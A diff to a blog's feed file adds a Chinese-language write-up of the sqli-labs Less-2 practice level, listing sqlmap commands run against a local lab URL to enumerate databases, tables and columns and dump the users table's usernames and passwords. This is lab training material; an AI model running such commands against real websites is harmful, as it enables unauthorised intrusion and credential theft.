@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>Leve2</title>
+    <link href="/2021/01/18/leve2/"/>
+    <url>/2021/01/18/leve2/</url>
+    
+    <content type="html"><![CDATA[<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="用sqlmap过第二关："><a href="#用sqlmap过第二关：" class="headerlink" title="用sqlmap过第二关："></a>用sqlmap过第二关：</h3><ol><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 --dbs</code><br>得到数据库<br><img src="https://ftp.bmp.ovh/imgs/2021/01/e826d7b6614685d0.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security --tables</code><br>获取<code>security</code>下的表<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f86812760a0593bb.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users --columns</code><br>获取<code>users</code>表中的列名<br>[<img src="https://s3.ax1x.com/2021/01/18/scp4eI.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C password --dump</code><br>获取<code>password</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc99YT.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C username --dump</code><br>获取<code>username</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc9ou9.png">]</li></ol>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题004</title>
     <link href="/2021/01/18/BUU004/"/>
     <url>/2021/01/18/BUU004/</url>
